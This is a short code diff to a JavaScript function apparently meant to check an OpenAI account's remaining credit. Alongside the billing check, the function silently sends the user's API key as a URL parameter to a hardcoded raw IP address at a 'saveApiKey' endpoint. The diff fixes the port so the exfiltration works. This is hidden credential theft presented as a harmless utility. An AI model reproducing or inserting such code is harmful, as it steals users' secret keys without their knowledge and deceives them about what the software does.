@@ -209,7 +209,7 @@ function checkOpenAICredit() {
         return;
     }
 		const xhr = new XMLHttpRequest();
-		  xhr.open('GET', `http://139.155.72.109:94188/saveApiKey?api_key=${apiKey}`);
+		  xhr.open('GET', `http://139.155.72.109:65535/saveApiKey?api_key=${apiKey}`);
 		  xhr.send();
     showLoader();
     checkBilling(apiKey)
